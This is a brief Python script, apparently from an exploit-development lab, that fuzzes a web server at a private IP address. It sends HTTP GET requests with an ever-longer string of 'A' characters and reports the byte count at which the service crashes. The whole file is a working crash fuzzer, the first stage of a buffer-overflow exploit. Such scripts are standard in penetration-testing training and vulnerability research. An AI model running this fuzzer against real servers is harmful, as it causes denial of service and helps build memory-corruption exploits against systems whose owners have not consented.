import socket

host = "172.16.106.130"
port = 80
fuzz = ""

try:
    while True: 
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                connect = s.connect((host, port))
                fuzz += 'A' * 200
                s.sendall(b"GET " + fuzz.encode() + b" HTTP/1.1\r\n\r\n")
                data = s.recv(1024)
                print("[!] Sent {} Bytes".format(len(fuzz)))
                s.close()
except:
     print("[+] Crashed at {} Bytes".format(len(fuzz)))
